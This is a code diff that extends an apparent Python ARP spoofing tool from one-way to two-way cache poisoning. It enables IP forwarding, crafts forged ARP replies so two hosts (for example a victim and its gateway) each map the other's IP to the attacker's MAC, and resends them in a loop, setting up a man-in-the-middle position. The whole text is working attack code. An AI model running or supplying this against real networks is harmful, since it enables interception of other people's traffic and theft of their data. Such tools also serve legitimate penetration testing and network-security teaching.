@@ -177,17 +177,15 @@ def restoreARP(srcMAC, srcIP, targetMAC, targetIP, sock=None):
         raise Exception
 
 
-def spoof(iface, spoofIP, srcIP, targetIP, intervals=30):
+def spoof(iface, target1IP, srcIP, target2IP, intervals=30):
     """ Spoofs an IP Address with your MAC address.
     @param iface: Interface to use.
-    @param spoofIP: IP to spoof.
+    @param target1IP: Destination IP address.
     @param srcIP: Source IP address.
-    @param targetIP: Destination IP address.
+    @param target2IP: IP to spoof.
     @param intervals: Seconds to send the next packet (Default 30).
     """
     sock = None
-    srcMAC = None
-    dstMAC = None
 
     try:
         changeIPForwarding("1")
@@ -195,17 +193,29 @@ def spoof(iface, spoofIP, srcIP, targetIP, intervals=30):
 
         srcMAC = getInterfaceMAC(iface)
 
-        print("\033[1;32m[*]\033[0;0m Asking who-has ", targetIP)
-        dstMAC = getHostMac(targetIP, iface, srcIP, sock)
+        print("\033[1;32m[*]\033[0;0m Asking who-has ", target1IP)
+        target1MAC = getHostMac(target1IP, iface, srcIP, sock)
 
-        ethernetPacket = EtherEncode(dst=dstMAC, src=srcMAC).craftPacket()
+        print("\033[1;32m[*]\033[0;0m Asking who-has ", target2IP)
+        target2MAC = getHostMac(target2IP, iface, srcIP, sock)
 
-        arpPacket = ARPEncode(srcMAC, spoofIP, dstMAC, targetIP, opcode=0x0002).craftPacket()
-        packet = ethernetPacket + arpPacket
+        # Target 1 Packet.
+        ethernetPacket1 = EtherEncode(dst=target1MAC, src=srcMAC).craftPacket()
+        arpPacket1 = ARPEncode(srcMAC, target2IP, target1MAC, target1IP, opcode=0x0002).craftPacket()
+        packet1 = ethernetPacket1 + arpPacket1
+
+        # Target 2 packet.
+        ethernetPacket2 = EtherEncode(dst=target2MAC, src=srcMAC).craftPacket()
+        arpPacket2 = ARPEncode(srcMAC, target1IP, target2MAC, target2IP, opcode=0x0002).craftPacket()
+        packet2 = ethernetPacket2 + arpPacket2
 
         while True:
-            print("\033[1;34m[!]\033[0;0m Spoofing {0} with {1}->{2}".format(spoofIP, srcMAC, spoofIP))
-            sock.send(packet)
+            print("\033[1;34m[!]\033[0;0m Spoofing {0} with {1}->{2}".format(target1IP, srcMAC, target2IP))
+            sock.send(packet1)
+
+            print("\033[1;34m[!]\033[0;0m Spoofing {0} with {1}->{2}".format(target2IP, srcMAC, target1IP))
+            sock.send(packet2)
+
             time.sleep(intervals)
 
     except KeyboardInterrupt:
@@ -215,8 +225,8 @@ def spoof(iface, spoofIP, srcIP, targetIP, intervals=30):
         print(genErr.with_traceback(), file=sys.stderr)
 
     finally:
-        restMAC = getHostMac(spoofIP, iface, srcIP)
-        restoreARP(restMAC, spoofIP, dstMAC, targetIP, sock)
+        restoreARP(target2MAC, target2IP, target1MAC, target1IP, sock)
+        restoreARP(target1MAC, target1IP, target2MAC, target2IP, sock)
         sock.close()
         sys.exit()
 
@@ -229,15 +239,15 @@ def main():
     parser.add_argument("-i", dest="iface", action="store", required=True,
                         help="Interface")
 
-    parser.add_argument("-t", dest="target", action="store", required=True,
+    parser.add_argument("-t", dest="target1", action="store", required=True,
                         help="Target IP", metavar="IP")
 
-    parser.add_argument("-s", dest="spoof", action="store", required=True,
+    parser.add_argument("-s", dest="target2", action="store", required=True,
                         help="IP address to spoof (e.g The gateway)", metavar="IP")
 
     args = parser.parse_args()
 
-    spoof(args.iface, args.spoof, args.source, args.target)
+    spoof(args.iface, args.target1, args.source, args.target2)
 
 
 if __name__ == '__main__':
